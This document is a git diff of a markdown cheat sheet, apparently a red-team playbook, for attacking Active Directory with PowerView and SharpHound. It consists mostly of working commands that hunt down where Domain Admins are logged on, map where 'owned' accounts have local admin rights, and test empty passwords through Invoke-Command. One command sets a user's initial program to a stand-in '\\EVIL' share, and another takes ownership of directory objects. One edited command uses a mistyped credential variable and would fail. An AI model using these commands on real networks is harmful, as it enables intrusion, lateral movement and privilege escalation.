@@ -28,12 +28,12 @@ permalink: /:categories/:title/
 		* [Privileged Machines](#PrivilegedMachines)
 	* [ITER(ated) Enumeration](#ITERatedEnumeration)
 		* [User groups](#Usergroups)
-		* [Admin & OU access](#AdminOUaccess)
-		* [RDP access](#RDPaccess)
-		* [PSRemote access](#PSRemoteaccess)
+		* [Scope of compromise](#Scopeofcompromise)
 	* [REFRESH(ed) Enumeration](#REFRESHedEnumeration)
 		* [Last Logons for DA, EA, ...](#LastLogonsforDAEA...)
-		* [Last logons on a computer](#Lastlogonsonacomputer)
+		* [Where targeted user is connected](#Wheretargeteduserisconnected)
+		* [Where targeted users' group are connected](#Wheretargetedusersgroupareconnected)
+		* [Who is logged on a computer](#Whoisloggedonacomputer)
 		* [Last logons on an OU](#LastlogonsonanOU)
 		* [Admin access to a computer](#Adminaccesstoacomputer)
 	* [Misc](#Misc)
@@ -235,7 +235,6 @@ $ztarg_grp="Domain Admins"
 #$ztarg_grp="Remote Desktop Users"
 #$ztarg_grp="DNSAdmins"
 Get-NetGroupMember $ztarg_grp -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
-Invoke-UserHunter -Group $ztarg_grp -Domain $zdom_fqdn -DomainControler $zdom_dc_fqdn | select computername, membername
 ```
 
 #### <a name='PrivilegedMachines'></a>Privileged Machines
@@ -261,21 +260,17 @@ get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn, when
 get-content pwned_accounts.txt | get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount | ft -autosize | Sort-Object -Descending -Property whenCreated >> .\auth_xxx.txt
 ```
 
-#### <a name='AdminOUaccess'></a>Admin & OU access 
+#### <a name='Scopeofcompromise'></a>Scope of compromise 
 ```powershell
-# if new groups, find where the account is local admin
+# STEP 1: if new groups, find where the account is local admin
 Find-LocalAdminAccess -ComputerDomain $zdom_fqdn -Server $zdom_dc_fqdn >> .\owned_machines.csv
 
-# get the details of the owned machines with the OUs 
-get-content .\owned_machines.csv | %{get-netcomputer $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn} | select-object -Property cn, dnshostname, distinguishedname | ft -autosize >> ;\owned_machines_w_ou.csv
+# STEP 2.1: get the DNs of the owned machines 
+get-content .\owned_machines.csv | %{get-netcomputer $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn} | select-object -Property distinguishedname | ft -autosize >> .\owned_machines_w_ou.csv
 
+# STEP 2.2: get the OS of the owned machines 
+get-content .\owned_machines.csv | %{get-netcomputer $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn} | select-object -Property cn,operatingSystem | ft -autosize >> .\owned_machines_w_ou.csv
 ```
-
-#### <a name='RDPaccess'></a>RDP access
-[Bloodhound readthedocs - edge canRDP ](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
-
-#### <a name='PSRemoteaccess'></a>PSRemote access
-[Bloodhound readthedocs - edge canPSRemote ](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
 
 ### <a name='REFRESHedEnumeration'></a>REFRESH(ed) Enumeration
 
@@ -293,16 +288,22 @@ Get-NetGroupMember $ztarg_grp -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 
 # find admin groups based on "adm" keyword
 Get-NetGroup -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn *adm* 
-
-# PowerView: find where DA has logged on / and current user has access
-# can be long and noisy, does net share discovery over \\machine\IPC$
-Invoke-UserHunter -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
-Invoke-UserHunter -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
-Invoke-UserHunter -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select username, computername, IPAddress
- ./sharphound.exe -c computeronly --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn
 ```
 
-#### <a name='Lastlogonsonacomputer'></a>Last logons on a computer
+#### <a name='Wheretargeteduserisconnected'></a>Where targeted user is connected
+```powershell
+$ztarg_user=xxx
+Invoke-UserHunter $ztarg_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Invoke-UserHunter $ztarg_user -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Invoke-UserHunter $ztarg_user -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select username, computername, IPAddress
+```
+
+#### <a name='Wheretargetedusersgroupareconnected'></a>Where targeted users' group are connected
+```powershell
+Invoke-UserHunter -Group $ztarg_grp -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select computername, membername
+```
+
+#### <a name='Whoisloggedonacomputer'></a>Who is logged on a computer
 ```powershell
 # get actively logged users on a computer
 Get-NetLoggedon -ComputerName $ztarg_computer_fqdn
@@ -311,14 +312,14 @@ Get-NetLoggedon -ComputerName $ztarg_computer_fqdn
 Get-LastLoggedon -ComputerName $ztarg_computer -Credential $zlat_creds
 
 # testing account "john_doe" with empty passwords 
-$mycreds = New-Object System.Management.Automation.PSCredential("john_doe", (new-object System.Security.SecureString))
-Invoke-Command -Credential $mycreds -ComputerName $computer -ScriptBlock {whoami; hostname}
+$zlat_creds = New-Object System.Management.Automation.PSCredential($ztarg_user, (new-object System.Security.SecureString))
+Invoke-Command -Credential $zlat_credz -ComputerName $ztarg_computer -ScriptBlock {whoami; hostname}
 ```
 
 #### <a name='LastlogonsonanOU'></a>Last logons on an OU
 ```powershell
 # Get the logged on users for all machines in any *server* OU in a particular domain
-Get-DomainOU -Identity $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-DomainComputer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}}
+Get-DomainOU -Identity $ztarg_computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-DomainComputer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}}
 ```
 
 #### <a name='Adminaccesstoacomputer'></a>Admin access to a computer
@@ -407,8 +408,8 @@ Get-DomainOU -GPLink '<GPP_GUID>' -Domain $zdom_fqdn -DomainController $zdom_dc_
 
 # enumerate what machines that a particular user/group identity has local admin rights to
 #   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
-Get-DomainGPOUserLocalGroupMapping -Identity $user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
-Get-DomainGPOUserLocalGroupMapping -Identity $group -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Get-DomainGPOUserLocalGroupMapping -Identity $ztarg_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+Get-DomainGPOUserLocalGroupMapping -Identity $ztarg_group -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
 # export a csv of all GPO mappings
 Get-DomainGPOUserLocalGroupMapping -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
@@ -417,7 +418,7 @@ Get-DomainGPOUserLocalGroupMapping -Domain $zdom_fqdn -DomainController $zdom_dc
 Get-DomainGPO -ComputerIdentity $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 
 # find all policies applied to an user
-Find-GPOLocation -UserName $user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
+Find-GPOLocation -UserName $ztarg_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
 ```
 
 #### <a name='T1135NetworkShares'></a>T1135 Network Shares
@@ -512,6 +513,6 @@ Get-DomainGroup -GroupScope NotGlobal -Properties name -Domain $zdom_fqdn -Domai
 # set the specified property for the given user identity
 Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 
-# Set the owner of 'dfm' in the current domain to $ztarg_user
-Set-DomainObjectOwner -Identity dfm -OwnerIdentity $ztarg_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
+# set the owner of $ztarg_obj in the current domain to $zlat_user
+Set-DomainObjectOwner -Identity $ztarg_obj -OwnerIdentity $zlat_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
 ```
